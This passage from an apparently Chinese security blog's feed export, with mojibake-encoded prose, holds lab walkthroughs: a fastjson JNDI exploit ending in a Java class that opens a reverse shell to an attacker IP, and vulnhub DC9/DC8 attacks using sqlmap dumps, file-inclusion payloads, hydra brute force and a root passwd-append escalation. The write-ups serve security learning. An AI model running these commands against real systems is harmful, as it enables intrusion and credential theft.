class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/mbechler/marshalsec.git</span><br></pre></td></tr></table></figure><p>å®‰è£…mavenå¹¶ç¼–è¯‘marshalsecç”Ÿæˆjar</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install maven</span><br><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417153908651.png" alt="image-20230417153908651"></p><p>æˆ‘ä»¬è¿›å…¥åˆ°marshalsecçš„targetç›®å½•é‡Œé¢è¿›è¡ŒæŸ¥çœ‹å·²ç»ç”Ÿæˆäº†marshalsec-0.0.3.3-SNAPSHOT-all.jarï¼Œç„¶åä½¿ç”¨marshalsecæ­å»ºä¸€ä¸ªRMIæœåŠ¡å™¨ï¼Œè¿™é‡Œçš„ipå°±æ˜¯ä½ æ”»å‡»æœºçš„ipï¼Œç«¯å£å¯ä»¥éšæ„</p><p>è¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨å¯åŠ¨<strong>LDAP</strong>æœåŠ¡ï¼Œæ•ˆæœæ˜¯ä¸€æ ·çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer<span class="string">&quot;http://192.168.1.8/#evilclass&quot;</span>9999java-cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer<span class="string">&quot;http://192.168.1.8/#evilclass&quot;</span><span class="number">9999</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„IPæ˜¯æ”»å‡»æœºip,ç«¯å£éšæ„</p><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨<strong>RMI</strong>æœåŠ¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://192.168.142.129ï¼š8000/#evilclass&quot;</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417155734179.png" alt="image-20230417155734179"></p><p>å…ˆå¼€å¯ä¸€ä¸ªpythonæœåŠ¡æ¥è¿›è¡Œæ–‡ä»¶çš„ä¸Šä¼ ï¼Œå¦‚ä½•RMIä½¿ç”¨çš„æ˜¯pythonçš„8000ç«¯å£</p><p><img src="../images/image-20230417155831781.png" alt="image-20230417155831781"></p><p>å¼€å¯RMIæœåŠ¡</p><p><img src="../images/image-20230417155903891.png" alt="image-20230417155903891"></p><p>æŠ“åŒ…è¿›è¡Œå‘åŒ…</p><p>å¦‚ä½•å°±ä¼šå‘ç°æˆåŠŸäº†</p><p><img src="../images/image-20230417155934820.png" alt="image-20230417155934820"></p><p><img src="../images/image-20230417160000493.png" alt="image-20230417160000493"></p><p><img src="../images/image-20230417160023376.png" alt="image-20230417160023376"></p><p>è¿™é‡Œå°±å’Œåˆšå¼€å§‹çš„æ—¶å€™evilclass.javaé‡Œå†™çš„ä¸€æ ·äº†ï¼Œå°±æ˜¯å¾€/tmpç›®å½•é‡Œå†™ä¸€ä¸ªtestæ–‡ä»¶</p><p>å¦‚æœè¦åå¼¹shellçš„åŒ–ï¼Œåªéœ€è¦ä¿®æ”¹commandsé‡Œçš„å†…å®¹å°±è¡Œäº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evilclass</span>&#123;</span><br><span class="line"><span class="keyword">static</span>&#123;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.142.129/9001 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line"><span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">pc.waitFor();</span><br><span class="line">&#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line"><span class="comment">// do nothing</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417160907087.png" alt="image-20230417160907087"></p><p>æˆåŠŸå°†shellåå¼¹</p><p>fastjsonçš„æ¼æ´å¤ç°çš„è¯éƒ½æ˜¯è¿™ä¸ªæ–¹å‘ï¼Œæˆ–è€…ä¿®æ”¹<code>com.sun.rowset.JdbcRowSetImpl</code>è¿™äº›ä¸œè¥¿ï¼Œå…¶ä»–çš„å°±ä¸è¿›è¡Œå¤ç°äº†</p><p>ä¸‹é¢å°±æ˜¯å‚è€ƒé“¾æ¥äº†  å…¶ä»–ä¸æ‡‚çš„ç‰ˆæœ¬å¯ä»¥è¿›è¡ŒæŸ¥çœ‹</p><p><a href="https://cloud.tencent.com/developer/article/1974944">å¹²è´§ï½œæœ€å…¨fastjsonæ¼æ´å¤ç°ä¸ç»•è¿‡</a></p><p><a href="https://www.freebuf.com/vuls/276812.html">Fastjsonæ¼æ´å¤ç°ç¬”è®°</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-DC9</title>
      <link href="/posts/b398db55.html"/>
      <url>/posts/b398db55.html</url>
      
        <content type="html"><![CDATA[<p><strong>æ€»ç»“ï¼š<a href="https://so.csdn.net/so/search?q=sqlæ³¨å…¥&amp;spm=1001.2101.3001.7020">sqlæ³¨å…¥</a>ï¼Œç«¯å£æ•²é—¨ï¼Œè¦†ç›–passwdææƒ</strong></p><p>å…ˆæ‰«ä¸€ä¸‹cæ®µ</p><p><img src="../images/image-20230414173216143.png" alt="image-20230414173216143"></p><p>å‘ç°ä¸»æœºï¼Œç„¶åè¿›è¡Œç«¯å£æ‰«æ</p><p><img src="../images/image-20230414173411019.png" alt="image-20230414173411019"></p><p>è¿˜æ˜¯ç€ä¸¤ä¸ªå¸¸è§„ç«¯å£</p><p><img src="../images/image-20230414173519934.png" alt="image-20230414173519934"></p><p>è¿™å°±æ˜¯ä¸Šé¢stateçš„è§£é‡Š</p><p>ç®€å•æ¥è¯´å°±æ˜¯ä¸çŸ¥é“22ç«¯å£æ˜¯å¼€çš„è¿˜æ˜¯å…³çš„</p><p>äºæ˜¯æˆ‘ä»¬å°±å»å°è¯•ä¸€ä¸‹è®¿é—®80ç«¯å£</p><p><img src="../images/image-20230414173658881.png" alt="image-20230414173658881"></p><p>å‘ç°ä¸€ä¸ªç½‘ç«™ï¼Œä½†æ˜¯ä¸æ˜¯ä¸€ä¸ªcms</p><p>äºæ˜¯æˆ‘ä»¬å°±å¼€å§‹æ¢ç´¢ç½‘ç«™ï¼Œçœ‹å­˜åœ¨å“ªäº›å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹</p><p><img src="../images/image-20230414173849111.png" alt="image-20230414173849111"></p><p><img src="../images/image-20230414173859531.png" alt="image-20230414173859531"></p><p>ä¸Šé¢çš„sqlè¯­å¥ä¼šæŠŠä¸‹é¢çš„å†…å®¹ç»™çˆ†å‡ºæ¥ï¼Œæ‰€ä»¥å°±æ˜¯è¯´è¿™ä¸ªåœ°æ–¹å­˜åœ¨sqlæ¼æ´ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è¿›è¡ŒsqlmapæŸ¥çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.10/results.php&quot; --data &quot;search=1&quot; --dbs --batch</span><br><span class="line">sqlmap -u &quot;http://192.168.1.10/results.php&quot; --data &quot;search=1&quot; -D &quot;Staff&quot; --tables --dbs --batch</span><br><span class="line">sqlmap -u &quot;http://192.168.1.10/results.php&quot; --data &quot;search=1&quot; -D &quot;Staff&quot; -T &quot;Users&quot; --columns --dbs --batch</span><br><span class="line">sqlmap -u &quot;http://192.168.142.136/results.php&quot; --data &quot;search=1&quot; -D &quot;Staff&quot; -T &quot;Users&quot; -C &quot;Username&quot;,&quot;Password&quot; --dump --dbs</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414174311321.png" alt="image-20230414174311321"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡Œæˆ‘ä»¬å°±å¾—åˆ°äº†adminçš„å¯†ç äº†</span><br><span class="line"></span><br><span class="line">admin:transorbital1</span><br></pre></td></tr></table></figure><p>ç„¶åè¿›è¡Œç™»å½•</p><p><img src="../images/image-20230414174618993.png" alt="image-20230414174618993"></p><p>æˆåŠŸè¿›è¡Œç™»å½•</p><p><strong>æ–‡ä»¶åŒ…å«</strong></p><p>æœ‰ä¸ªæç¤ºï¼š<code>File does not exist</code> æ˜¾ç¤ºæ–‡ä»¶ä¸å­˜åœ¨ é€šè¿‡æµ‹è¯• å‘ç° å¯èƒ½æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´å‘ç°è¿™é‡Œå¾—ç”¨æˆ·å’Œåˆšåˆšæ•°æ®åº“é‡Œçš„ç”¨æˆ·æœ‰äº›ä¸€æ ·çš„</p><p><img src="../images/image-20230414174903776.png" alt="image-20230414174903776"></p><p>æˆåŠŸè¯»å–ï¼Œè¯´æ˜è¿™é‡Œå­˜åœ¨æ–‡ä»¶åŒ…å«</p><p><img src="../images/image-20230414175012672.png" alt="image-20230414175012672"></p><p>è¿™é‡ŒçŸ¥é“ä¸å°‘ç”¨æˆ·çš„è´¦å·ï¼Œ è€Œä¸”éƒ½æ˜¯/bin/bash,ä½†æ˜¯è¯´22ç«¯å£ä¸çŸ¥é“æ˜¯æœ‰æ²¡æœ‰å¼€å¯çš„ï¼Œç„¶åå§ï¼Œå’±ä»¬åˆä¸çŸ¥é“å¹²ä»€ä¹ˆäº†ã€‚çœ‹çœ‹å…¶ä»–äººçš„ï¼Œè¿™é‡Œæˆ‘ä»¬å°±çŸ¥é“è¦å»æŸ¥çœ‹linuxä¸­çš„ä»»åŠ¡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//æŸ¥çœ‹linuxçš„ä»»åŠ¡</span><br><span class="line">http://é¶æœºip/welcome.php?file=../../../../../../proc/sched_debug</span><br></pre></td></tr></table></figure><p> è¿™é‡Œå› ä¸ºå¤ªä¹±äº†æ²¡æœ‰æ’åºï¼Œè¿™é‡Œæ•™ç»™å¤§å®¶ä¸€ä¸ªå¥½æ–¹æ³•ï¼Œè¿™é‡Œç›´æ¥ctrl+uç›´æ¥æŸ¥çœ‹æºä»£ç ï¼Œä»–å°±ä¼šè‡ªåŠ¨ç»™æˆ‘ä»¬æ’åˆ—äº†ã€‚</p><p><img src="../images/image-20230414175829926.png" alt="image-20230414175829926"></p><p>è¿™é‡Œå‘ç°äº†è¿™ä¸ªknockdæœåŠ¡</p><p>ç„¶åæˆ‘ä»¬å°±å»æŸ¥çœ‹ä»–çš„é…ç½®æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://é¶æœºip/welcome.php?file=../../../../../../etc/knockd.conf</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414175946047.png" alt="image-20230414175946047"></p><p>é‚£ä¹ˆè¿™é‡Œå°±æ¶‰åŠåˆ°ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹äº†</p><h3 id="ç«¯å£æ•²é—¨"><a href="#ç«¯å£æ•²é—¨" class="headerlink" title="ç«¯å£æ•²é—¨"></a>ç«¯å£æ•²é—¨</h3><p>è¿™é‡Œåˆ†æä¸€ä¸‹è¿™ä¸ªé…ç½®æ–‡ä»¶ï¼Œåœ¨æŒ‰å¾ªåºè®¿é—®äº†è¿™ä¸ªä¸‰ä¸ªç«¯å£ï¼Œlinuxé˜²ç«å¢™å°±ä¸ä¼šé˜²æˆ‘ä»¬äº†ï¼Œiptableså°±æ˜¯linuxè®¾ç½®é˜²ç«å¢™çš„å‘½ä»¤ï¼Œè¿™é‡Œç»™å¤§å®¶æ¨èä¸€ä¸ªåšå®¢ï¼Œçœ‹å®Œä¹Ÿå°±ç†è§£ç«¯å£æ•²é—¨æ˜¯ç”¨æ¥çœ‹ä»€ä¹ˆçš„äº†<a href="https://blog.csdn.net/m0_65129142/article/details/121993950">Webç«¯å£æ•²é—¨çš„å¥‡æ€å¦™æƒ³</a>    <a href="https://zhuanlan.zhihu.com/p/59488488">ç«¯å£æ•²é—¨</a></p><p>æ‰€ä»¥<strong>æ•²é—¨å¯†ç </strong>æˆ‘ä»¬ä»å“ªè·å–å‘¢ï¼Œå°±æ˜¯é€šè¿‡è®¿é—®<strong>knockæœåŠ¡çš„é…ç½®æ–‡ä»¶</strong>ï¼Œç„¶åä»ä¸­è·å–</p><p><img src="../images/image-20230414181653673.png" alt="image-20230414181653673"></p><p>é…ç½®æ–‡ä»¶ä¸­ç»™æˆ‘ä»¬æä¾›äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS é¶æœºip -p 7469</span><br><span class="line">nmap -sS é¶æœºip -p 8475</span><br><span class="line">nmap -sS é¶æœºip -p 9842</span><br><span class="line"></span><br><span class="line">//è¿™é‡Œæœ‰ä¸€ä¸ªå·¥å…·ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯æ„Ÿè§‰å¾ˆæ…¢</span><br><span class="line">//æ²¡æœ‰éœ€è¦è‡ªå·±ä¸‹ï¼Œapt install knockd</span><br><span class="line">knock é¶æœºip 7469 8475 9842</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414181856542.png" alt="image-20230414181856542"></p><p>å‘ç°sshç«¯å£æˆåŠŸæ‰“å¼€</p><p>åˆ©ç”¨sqlmapæŸ¥åˆ°çš„å…¨éƒ¨ç”¨æˆ·åå’Œå¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.142.136/results.php&quot; --data &quot;search=1&quot; -D users -T UserDetails --dump</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414182229536.png" alt="image-20230414182229536"></p><p>äºæ˜¯è¿›è¡Œsshçˆ†ç ´ï¼Œåˆ©ç”¨ä¹‹å‰ç”¨åˆ°çš„å·¥å…·ï¼Œ<code>hydra</code></p><p>å› ä¸ºä¸çŸ¥é“å“ªäº›ç”¨æˆ·èƒ½è¿›è¡Œsshç™»å½•</p><p>å‘ç°äº†ä¸‰ä¸ªç”¨æˆ·åˆ†åˆ«æ˜¯ <code>joeyt Passw0rd</code> å’Œ<code>janitor Ilovepeepee</code> å’Œ<code>chandlerb UrAG0d</code></p><p><img src="../images/image-20230414183153111.png" alt="image-20230414183153111"></p><p>ä½¿ç”¨å‘½ä»¤ï¼š<code>ssh joeyt@192.168.142.136</code> ï¼ˆè¿™é‡Œipè‡ªåŠ¨è·å–äº†ä¸ç”¨åœ¨æ„ä¸€æ ·çš„ï¼‰ç­‰ä¸‰ä¸ªç”¨æˆ·éƒ½è¿›è¡Œç™»å…¥çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆéšè—çš„ä¿¡æ¯</p><p><img src="../images/image-20230414183205288.png" alt="image-20230414183205288"></p><p><img src="../images/image-20230414183129965.png" alt="image-20230414183129965"></p><p><img src="../images/image-20230414183411763.png" alt="image-20230414183411763"></p><p>å‘ç°å­˜åœ¨ä¸€ä¸ªå¯†ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ‹¿è¿™äº›å¯†ç æ·»åŠ åˆ°ç”¨æ¥çˆ†ç ´çš„å­—å…¸é‡Œï¼Œçœ‹è¿˜èƒ½ä¸èƒ½å†çˆ†ç ´å‡ºæ¥ä¸€äº›å¯ç™»å½•çš„è´¦å·å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P pass.txt ssh://192.168.142.136</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414183714258.png" alt="image-20230414183714258"></p><p>å‘ç°ä¸€ä¸ªæ–°è´¦å·  äºæ˜¯è¿›è¡Œç™»å½•</p><p><img src="../images/image-20230414183837607.png" alt="image-20230414183837607"></p><p>ç™»å½•æˆåŠŸ  </p><h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p>è¿˜æ˜¯è€ä¸‰æ ·  </p><p>suid <code>sudo -l</code>  å†…æ ¸ææƒ</p><p><img src="../images/image-20230414183955956.png" alt="image-20230414183955956"></p><p>è®¿é—®è¿™ä¸ªç›®å½•è¿›è¡ŒæŸ¥çœ‹è¿™æ˜¯ä»€ä¹ˆä¸œè¥¿</p><p><img src="../images/image-20230414184127144.png" alt="image-20230414184127144"></p><p>å‘ç°è¿™ä¸ª<code>test</code>æ˜¯ä¸€ä¸ª<code>python</code>æ–‡ä»¶</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¾—å»æ‰¾è¿™ä¸ª<code>test.py</code>æ–‡ä»¶</p><p>çœ‹çœ‹ä»–ä¸ºä»€ä¹ˆèƒ½è¿›è¡Œææƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨å‘½ä»¤ï¼šfind / -name test.py 2&gt;/dev/null æŸ¥æ‰¾pythonæ–‡ä»¶ è¿›è¡ŒæŸ¥çœ‹</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414200337779.png" alt="image-20230414200337779"></p><p>å‘ç°è¿™ä¸ªtest.pyæ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span> (sys.argv) != <span class="number">3</span> :</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Usage: python test.py read append&quot;</span>)</span><br><span class="line">    sys.exit (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">2</span>], <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¤§æ¦‚çš„å°±æ˜¯å°†å‚æ•°<code>1</code>çš„å†…å®¹å†™åˆ°å‚æ•°<code>2</code>ä¸­ç„¶åç”Ÿæˆä¸€ä¸ªç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//ä½¿ç”¨opensslå‘½ä»¤</span><br><span class="line">openssl passwd -1 -salt hahaha 123456</span><br><span class="line">ç”Ÿæˆ$1$hahaha$hSxFjZSHRoiEn4DYrrGUI.</span><br><span class="line"> </span><br><span class="line">//å› ä¸ºæ²¡æœ‰æƒé™å…ˆæ¥åˆ°tmp</span><br><span class="line">echo &#x27;hahaha:$1$hahaha$hSxFjZSHRoiEn4DYrrGUI.:0:0::/root/:/bin/bash&#x27; &gt;&gt; passwd</span><br><span class="line"> </span><br><span class="line">//è¿™é‡Œä½¿ç”¨test</span><br><span class="line">sudo /opt/devstuff/dist/test/test passwd /etc/passwd</span><br><span class="line">//è¿™é‡Œæ‰§è¡Œçš„test.pyæ˜¯ å°†/tmpä¸‹çš„ç”¨æˆ·æ·»åŠ åˆ°/etc/passwdä¸‹</span><br><span class="line"> </span><br><span class="line">//ç„¶åæ›¿æ¢åˆ°hahahaç”¨æˆ·ï¼Œå¯†ç 123456</span><br><span class="line">su hahaha</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/minioesina/article/details/88145581?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-88145581-blog-54884976.235^v29^pc_relevant_default_base3&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3">opensslå‘½ä»¤çš„è§£é‡Š</a></p><p><img src="../images/image-20230414204810615.png" alt="image-20230414204810615"></p><p><img src="../images/image-20230414205017910.png" alt="image-20230414205017910"></p><p><strong>â‘£ï¼šå°±æ˜¯/etc/passwd çš„æ ¼å¼ è¿™ä¸ªä¸äº†è§£çš„è¯æœ€å¥½ä¸€æ­¥ææƒå¾ˆå®¹æ˜“é”™çš„</strong><br><strong>æ ¼å¼ï¼šç”¨æˆ·åï¼šå¯†ç ï¼šUIDï¼ˆç”¨æˆ·IDï¼‰ï¼šGIDï¼ˆç»„IDï¼‰ï¼šæè¿°æ€§ä¿¡æ¯ï¼šä¸»ç›®å½•ï¼šé»˜è®¤Shell</strong><br><strong>ï¼ˆâ€xâ€ è¡¨ç¤ºæ­¤ç”¨æˆ·è®¾æœ‰å¯†ç ï¼Œä½†ä¸æ˜¯çœŸæ­£çš„å¯†ç ï¼ŒçœŸæ­£çš„å¯†ç ä¿å­˜åœ¨ /etc/shadow æ–‡ä»¶ä¸­</strong><br><strong>å…è®¸ç™»å…¥çš„shellå°±æ˜¯/bin/bashç¦æ­¢shellç™»å…¥å°±æ˜¯/sbin/nologinï¼‰</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub DC9 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-DC8</title>
      <link href="/posts/c49febc3.html"/>
      <url>/posts/c49febc3.html</url>
      
        <content type="html"><![CDATA[<p><strong>æ€»ç»“ï¼šexim4<a href="https://so.csdn.net/so/search?q=ææƒ&amp;spm=1001.2101.3001.7020">ææƒ</a></strong></p><p>å…ˆæ‰«ä¸€ä¸‹cæ®µï¼Œæ‰¾ä¸€ä¸‹é¶æœº</p><p><img src="../images/image-20230414150131729.png" alt="image-20230414150131729"></p><p>æ¥ä¸‹æ¥æ‰«ä¸€ä¸‹ç«¯å£ï¼Œçœ‹å¼€æ”¾äº†å“ªäº›ç«¯å£</p><p><img src="../images/image-20230414150444248.png" alt="image-20230414150444248"></p><p>å‘ç°å­˜åœ¨äº†ä¸¤ä¸ªç«¯å£  80 å’Œ 22</p><p>è®¿é—®80ç«¯å£</p><p><img src="../images/image-20230414150611475.png" alt="image-20230414150611475"></p><p>è¿˜æ˜¯è€æ ·å­ï¼Œè¿˜æ˜¯è¿™ä¸ªcms</p><p>è¿™ä¸ªç‰ˆæœ¬çš„è¯å¾ˆåƒå­˜åœ¨æ¼æ´çš„æ ·å­</p><p><strong>Droopescanæ˜¯ä¸€æ¬¾åŸºäºæ’ä»¶çš„æ‰«æå™¨ï¼Œå¯å¸®åŠ©å®‰å…¨ç ”ç©¶äººå‘˜å‘ç°Drupalï¼ŒSilverStripeï¼ŒWordpressï¼ŒJoomlaï¼ˆæšä¸¾ç‰ˆæœ¬ä¿¡æ¯å’Œå¯åˆ©ç”¨URLåœ°å€ï¼‰å’ŒMoodleçš„é—®é¢˜ã€‚</strong></p><p>å­¦ä¹ ä¸€ä¸‹è¿™ä¸€æ¬¾å·¥å…·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/droope/droopescan.git</span><br><span class="line"></span><br><span class="line">cd droopescan</span><br><span class="line"></span><br><span class="line">pip install -r requirements.txt</span><br><span class="line"></span><br><span class="line">./droopescan scan --help</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å·¥å…·<code>droopescan</code>æ‰«ä¸€ä¸‹åå°ï¼ˆå› ä¸ºä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡ä½¿ç”¨æ‰€ä»¥ä¹Ÿæ˜¯å­¦ä¹ äº†ä¸€ä¸‹ï¼‰åå°åœ°å€ï¼š <code>192.168.0.104/user/login</code>æˆ‘ä»¬è¿˜æ˜¯å…ˆçœ‹ä¸‹ç½‘ç«™æœ‰æ²¡æœ‰æ¼æ´å…ˆ</p><p><strong>è¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨ ä½¿ç”¨åˆ«çš„æ‰«æå·¥å…·è¿›è¡Œæ‰«æï¼Œæ•ˆæœæ˜¯ä¸€æ ·çš„</strong></p><p><img src="../images/image-20230414150751373.png" alt="image-20230414150751373"></p><p>å‘ç°å­˜åœ¨ç±»ä¼¼sqlæ³¨å…¥çš„æ„Ÿè§‰ï¼Œæ‹¿sqlmapæ¥è¿›è¡Œå°è¯•ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.142.135/?nid=1 --dbs #åˆ—å‡ºæ•°æ®åº“</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414151758412.png" alt="image-20230414151758412"></p><p>å‘ç°ä¸¤ä¸ªæ•°æ®åº“</p><p>ç„¶åæŸ¥çœ‹è¡¨å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.142.135?nid=1 -D d7db --tables  #åˆ—å‡ºæ•°æ®åº“çš„è¡¨</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414152033676.png" alt="image-20230414152033676"></p><p>æŸ¥å‡ºä¸€å †è¡¨åï¼Œæ¥ä¸‹æ¥å°±æ˜¯æŸ¥åˆ—åäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.142.135?nid=1 -D d7db -T users --columns #åˆ—å‡ºå­—æ®µ</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414152151409.png" alt="image-20230414152151409"></p><p>ç„¶åå¼€å§‹è¿›è¡Œæ•°æ®çš„æŸ¥çœ‹äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.142.135?nid=1 -D d7db -T users -C name,pass -dump #åˆ—å‡ºè´¦å·å’Œå¯†ç </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414152515057.png" alt="image-20230414152515057"></p><p>å‘ç°æ˜¯è¿›è¡Œå¯†ç åŠ å¯†åçš„</p><p>äºæ˜¯å°è¯•è¿›è¡Œç ´è§£  (<strong>è¿™é‡Œä¼°è®¡åªèƒ½è¿›è¡Œjohnç ´è§£ï¼Œadminçš„è¯ï¼Œå­—å…¸é‡Œå¯èƒ½æ²¡æœ‰</strong>)</p><p><img src="../images/image-20230414152838028.png" alt="image-20230414152838028"></p><p>çˆ†å‡ºå¯†ç ï¼Œäºæ˜¯å°è¯•è¿›è¡Œç™»å½•</p><p><img src="../images/image-20230414152925308.png" alt="image-20230414152925308"></p><p>æˆåŠŸç™»å½•johnç”¨æˆ·</p><p>å‘ç°<code>Content</code>-&gt;ç‚¹å‡»<code>edit</code>-&gt;ç‚¹å‡»<code>WEBFORMS</code>-&gt;ç‚¹å‡»<code>Form settings</code>-&gt;ç‚¹å‡»ä¸‹æ‹‰æ¡†é€‰æ‹©<code>PHP code</code></p><p>è¿™é‡Œå¯ä»¥å†™æ–‡ä»¶è¿›è¡Œä¸Šä¼ </p><p><img src="../images/image-20230414153441690.png" 